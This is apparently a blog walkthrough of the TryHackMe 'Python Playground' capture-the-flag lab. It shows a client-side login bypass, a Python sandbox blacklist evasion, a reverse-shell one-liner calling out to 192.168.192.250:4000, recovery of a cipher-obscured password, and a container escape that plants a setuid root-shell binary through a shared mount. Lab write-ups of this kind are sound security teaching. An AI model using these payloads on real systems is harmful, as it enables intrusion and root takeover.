# Tryhackme  : python playground walkthrough

as always lets start by doing recon and this ctf specially is a hard rated ctf so i am expecting a lot of works to do so stay with me :

## RECON

in this case i prefer zenmap instead of nmap if u do not know about zenmap its the same thing as nmap but with the graphical interface

![Screenshot](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/9305dfc4-55e7-4e3c-bdd9-f175bd90feb9.png)

based on the zenmap lets check the website and see what we can find

checking the website there is not much info except bragging about their website being protected and staff and there is a login page and signup page link but when checked both links show only admins can access it so lets continue the recon by moving ouor scan to gobuster or u can use ffuf or dirbuster use what u prefer :

```plaintext
===============================================================
[+] Url:                     http://10.65.164.243
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                common.txt
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
2026/10/05 12:30:00 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 1420]
/login.html           (Status: 200) [Size: 950]
/signup.html          (Status: 200) [Size: 980]
/admin.html           (Status: 403) [Size: 412]
```

i have checked all of them except the admin page so lets do that:

![Screenshot](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/6068a8e7-4721-4eb5-a596-6cd57137a42d.png)

so in the admin page there is a login form so i was thinking using a username connor and brute force it but i checked the source code and got something.

in the source code the writer explained he is bad at server side code so that means the whole password is being checked in my browser that means i can overide it .

in this case we can use a custom python code or overide it on the browser it self . i am using the browser u . so i am running the following command on the console . there is no specific purpose why i use this "'super-secret-admin-testing-panel.html'" i tried another words but its returning not found so i used the word that most ctfs used but u can check the robots.txt or do your research if u want to find the specific path.

```plaintext
window.location = 'super-secret-admin-testing-panel.html'
```

and i run this code and get to the python playground means its python execution interface :

![Screenshot](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/cefc727c-ce0e-4a37-baa3-a8175ddd35d8.png)

there are security filters : using ( import , os ,socket ) is blocked but every thing is good to go : to by pass import ,Calling `__import__('subprocess')` as an attribute chain, without the literal blacklisted call pattern, gets through:

### reverse shell

lets to try to run python reverse shell and listen to response :

```plaintext
s = __import__("so" + "cket").socket(); s.connect(("192.168.192.250", 4000)); fd = s.fileno(); __import__("os").dup2(fd, 0); __import__("os").dup2(fd, 1); __import__("os").dup2(fd, 2); __import__("subprocess").call(["/bin/sh", "-i"])
```

```plaintext
find / -name "*flag1.txt*" 2>/dev/null
```

also u can still found the first flag on the playground but its still necessary to get the reverse shell . also the reverse shell gave us the shell with the root access .

for the next flag i need to recover credentials and A Python REPL transcript found while poking around revealed a custom double-pass letter-pair cipher and its ciphertext. Reversing it:

```plaintext
>>> def f_inv(s):
...     out = []
...     for i in range(0, len(s), 2):
...         a = ord(s[i]) - 97
...         b = ord(s[i+1]) - 97
...         out.append(chr(a*26 + b))
...     return ''.join(out)
...
... target = 'dxeedxebdwemdwesdxdtdweqdxefdxefdxdudueqduerdvdtdvdu'
... step1 = f_inv(target)   # undo the outer f
... password = f_inv(step1) # undo the inner f
... print(password)
...
spaghetti1245
```

so after that lets try to ssh as connor with the "spaghetti1245" as a password

```plaintext
ssh connor@10.65.164.243
```

and with that i am logged as connor :

```plaintext
find / -name "*flag2.txt*" 2>/dev/null
```

and there is only one flag left after that: when i tried to find flag 3 i found out its a dual environment:

To figure out that you are inside a **dual environment**

Here are the key indicators you check to confirm it:

### 1\. Check the Hostname vs. Environment Artifacts

*   **Container Hostnames:** Containers often have random, generic, or service-themed hostnames (like `playgroundweb`) that don't match standard naming conventions or what you'd expect on a full Linux server.

*   **Lack of Tools:** Basic system administration tools you'd expect to find on a full server (like `docker`, systemd utilities, or specific network interfaces) might be missing or restricted.


### 2\. Check the Process List (`ps -ef` or `top`)

*   Inside a container, you will usually see very few running processes. Often, the main application process (like a Node.js script, Python app, or Apache) is running as PID 1, completely isolated from the host's actual operating system processes.


### 3\. Check for Container Indicators in Filesystem (`/proc/1/cgroup`)

*   The definitive way to check if you are inside a Docker container is to inspect the control groups of the init process:


```bash
cat /proc/1/cgroup

```

*   If you see strings like `docker`, `kubepods`, or `lxc` in the output, it confirms you are running inside a container.


### 4\. Inspect Mount Points (`mount` or `findmnt`)

*   Running `mount` inside a container will often show a minimal set of mounts, typically an `overlay` or `aufs` root filesystem, along with any specific volumes the creator mapped in (such as our shared `/mnt/log` mount).


### 5\. Compare Users and System Files

*   As we saw earlier, checking `/etc/passwd` shows system service users, but key user accounts (like `connor`) might be completely absent from the container's files because they only exist on the host machine.


so connor has limited privilage but the container is running as root and there is a bridge to escalate privilage on connor :

### the bridge:

they share the same mount point with the host , mnt/log inside the container maps to var/log on the host .

### container escape:

lets try to plant SUID binary on the container that spawn a root shell to connor & compile it and save it to /mnt/log/prevesec and give it permission( chmod 4755) and finally trigger the file via connor /var/log/privesc and done i am root but when doing this your going to be going back and forth to the netcat and ssh so stay connected to the 2 of them till u finish the ctf .

### Step 1: Run these inside your Container (Netcat Shell)

Paste this block into your reverse shell to write, compile, and plant the SUID binary directly into the shared host mount

```plaintext
cat << 'EOF' > /tmp/privesc.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
EOF

gcc -static -o /mnt/log/privesc /tmp/privesc.c
chmod 4755 /mnt/log/privesc
ls -la /mnt/log/privesc
```

### Step 2: Run these on the Host (SSH Session as `connor`)

Switch over to your host SSH terminal session (using user `connor` and password `spaghetti1245`), and execute the planted binary to pop root:

```plaintext
/var/log/privesc -p
```

and finally we are root so lets find the last flag :

```plaintext
find / -name "*flag3.txt*" 2>/dev/null
```

thats it :

> thank you for reading!!